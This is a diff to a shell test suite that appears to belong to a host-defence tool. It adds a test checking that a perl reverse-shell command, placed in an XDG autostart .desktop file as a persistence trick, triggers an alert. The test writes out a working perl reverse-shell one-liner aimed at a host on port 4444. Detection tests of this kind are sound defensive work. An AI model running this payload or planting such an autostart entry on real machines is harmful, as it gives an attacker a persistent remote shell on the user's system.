@@ -303,3 +303,17 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on XDG autostart surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp XDG
+    # autostart variants. Perl on every Debian/Ubuntu desktop.
+    # Locks perl axis on T1547.013 XDG Autostart per-graphical-
+    # login persistence — runs AS user on every desktop session
+    # start.
+    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Desktop Entry]\nType=Application\nExec=perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${AUTOD}/evil.desktop"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
